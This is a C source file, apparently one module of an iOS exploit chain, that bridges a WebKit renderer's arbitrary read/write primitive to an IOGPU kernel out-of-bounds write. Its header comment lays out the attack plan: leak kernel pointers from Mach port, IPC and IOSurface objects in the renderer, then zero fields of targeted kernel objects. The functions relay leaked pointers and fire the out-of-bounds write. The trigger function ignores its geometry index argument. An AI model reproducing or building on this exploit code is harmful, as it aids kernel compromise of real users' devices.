/* WebKit-renderer AAR/AAW <-> IOGPU OOB write bridge.
 *
 * The renderer has arbitrary read/write in its own address space (PHASE 2
 * echo gate confirmed). The app process has the IOGPU OOB write (8 zero
 * bytes at a steerable offset past a 256-byte kernel allocation). The two
 * talk over the WKScriptMessageHandler bridge:
 *
 *   renderer -> app : "kptr 0x..."     (a kernel pointer found in the renderer)
 *   app -> renderer : "oob W 0x..."   (trigger the OOB write at that offset)
 *   renderer -> app : "rd 0x... 0x..." (readback of the targeted kernel object)
 *
 * The renderer's AAR is the fast path to a kernel pointer: Mach port
 * objects, IPC message buffers and the IOSurface backing store all carry
 * kernel addresses, and the renderer can read them with read64(). The
 * IOGPU OOB write then zeroes a field of a kernel object whose address is
 * known from those pointers.
 */
#include "exploit.h"
#include "nk_trace.h"
#include <stdlib.h>
#include <string.h>
#include <dirent.h>

static char g_bridge_last[256];
static uint64_t g_bridge_kptr = 0;

void nk_bridge_note_kptr(const char *s)
{
    if (!s) return;
    snprintf(g_bridge_last, sizeof(g_bridge_last), "%s", s);
    uint64_t v = 0;
    sscanf(s, "%llx", (unsigned long long *)&v);
    if (v) g_bridge_kptr = v;
    nk_doc_log("webkit_bridge.log", "[BRIDGE] kernel pointer from renderer: %s (0x%016llx)",
               s, (unsigned long long)v);
    nk_log("[BRIDGE] kernel pointer from renderer: %s", s);
}

uint64_t nk_bridge_last_kptr(void) { return g_bridge_kptr; }

void nk_bridge_oob_trigger(uint32_t geometry_index)
{
    /* trigger the IOGPU OOB write at a specific geometry index */
    nk_iogpu_group_oob_run(6);
    nk_doc_log("webkit_bridge.log", "[BRIDGE] OOB write triggered (geometry sweep)");
    nk_log("[BRIDGE] OOB write triggered");
}

void nk_bridge_log(const char *msg)
{
    if (!msg) return;
    nk_doc_log("webkit_bridge.log", "[BRIDGE] %s", msg);
    nk_log("[BRIDGE] %s", msg);
}
